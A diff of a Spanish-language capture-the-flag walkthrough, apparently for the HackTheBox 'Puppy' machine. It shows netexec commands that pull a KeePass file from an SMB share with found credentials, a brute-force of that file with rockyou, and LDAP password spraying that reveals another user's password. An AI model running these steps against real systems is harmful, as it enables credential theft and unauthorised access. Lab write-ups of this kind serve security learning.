@@ -122,17 +122,20 @@ KeePass es un **gestor de contraseñas de código abierto y gratuito** que te ay
 Nos descargamos el archivo que hemos encontrado con [[CRACKMAPEXEC-NETEXEC]]
 `netexec smb $IP -u 'levi.james' -p 'KingofAkron2025!' --share 'DEV' --get-file 'recovery.kdbx' 'recovery.kdbx'`
 
-Lo añadimos a Keepassxc el archivo y nos pide una passwd
-como no la tenemos la hacemos fuerza bruta
+El archivo descargado lo subimos **Keepassxc** para poder ver su contenido nos pide una password como no tenemos esta contraseña haremos fuerza bruta hacia el archivo
 
 Usaremos `./keepas4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt`
 La contraseña que nos devuelve es `liverpool`
 
-Dentro del archivo encontramos contraseñas, que las añadimos a un archivo y lo guardamos
-Y haremos fuerza bruta a los primeros usuarios encontrados
-`nxc ldap $IP -u users.txt -p pass.txt --continu-on-success | grep '[+]'`
-Nos encuentra el siguiente user
-`[+] PUPPY.HTB\ant.edwards:Antman2025!`
+Una vez conseguimos ver los datos de usuarios y passwords guardaremos las contraseñas en un archivo, y junto con los usuarios que encontramos al principio y haremos fuerza bruta para ver si alguna contraseña le pertenece a algún usuario. 
+Usaremos [[CRACKMAPEXEC-NETEXEC]]
+`netexec ldap $IP -u users.txt -p pass.txt --continu-on-success | grep '[+]'`
+
+Nos encuentra el siguiente user y su password
+```ad-hint
+[+] PUPPY.HTB\ant.edwards:Antman2025!
+```
+
 
 
 
